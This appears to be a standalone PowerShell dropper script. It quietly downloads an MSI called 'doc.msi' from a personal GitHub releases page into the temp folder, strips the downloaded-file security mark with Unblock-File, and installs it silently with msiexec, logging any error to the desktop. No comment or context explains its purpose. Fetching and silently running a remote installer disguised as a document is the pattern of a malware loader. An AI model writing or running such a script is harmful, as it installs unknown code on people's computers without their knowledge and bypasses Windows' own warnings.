$ErrorActionPreference = 'Stop'
try {
    $msi = "$env:TEMP\doc.msi"
    curl.exe -s -L -o $msi "https://github.com/okursammyok-ship-it/t/releases/download/new/doc.msi"
    Unblock-File $msi
    Start-Process msiexec.exe -ArgumentList '/i', $msi, '/qn', '/norestart' -Wait
} catch {
    $_ | Out-File "$env:USERPROFILE\Desktop\ps_err.txt"
}
